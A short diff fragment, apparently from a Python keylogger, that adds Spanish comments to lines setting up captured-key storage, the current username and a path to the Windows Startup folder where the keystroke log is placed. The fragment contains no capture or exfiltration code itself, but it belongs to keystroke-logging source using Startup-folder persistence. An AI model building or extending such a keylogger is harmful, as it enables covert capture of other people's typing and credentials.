@@ -28,9 +28,9 @@ open(filename,"w+")     # Abre (o crea en caso de no existir) el archivo en modo
 keys=[]
 count = 0 
 countInternet = 0
-word = "Key."
-username = os.getlogin()    
-destination = r'C:\Users\{}\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup'.format(username)
+word = "Key."   # Variable donde se almacena una tecla especial pulsada
+username = os.getlogin()    # Obtiene el nombre de usuario de la sesion activa
+destination = r'C:\Users\{}\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup'.format(username) # Ruta donde se guardara el archivo temporal con el registro del teclado
 
 #
 def _dir():
